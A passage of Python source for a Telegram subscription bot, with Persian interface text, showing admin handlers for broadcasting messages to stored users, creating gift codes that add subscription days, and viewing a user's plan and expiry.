def send_broadcast(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for u in users:
        try: 
            bot.send_message(u[0], f"📢 {message.text}"); count += 1; time.sleep(0.1)
        except: pass
    bot.reply_to(message, f"✅ پیام به {count} کاربر ارسال شد.")

def process_make_gift(message):
    try:
        parts = message.text.split()
        active_gift_codes[parts[0].upper()] = {"uses": 100, "amount": int(parts[1])}
        bot.reply_to(message, f"✅ کد هدیه `{parts[0].upper()}` با {parts[1]} روز ساخته شد.")
    except: bot.reply_to(message, "❌ فرمت اشتباه. مثال: `WELCOME 5`")

def view_user_admin(message):
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        expiry = datetime.fromtimestamp(user['sub_expiry']).strftime("%Y-%m-%d")
        bot.reply_to(message, f"👤 {user['name']}\n💎 {user['plan']}\n📅 انقضا: {expiry}")
    else: bot.reply_to(message, "❌ کاربر یافت نشد.")

if __name__ == "__main__":
    try:
        print("🤖 Bot & Web Server running...")
        bot.infinity_polling()
    except Exception as e:
        traceback.print_exc()
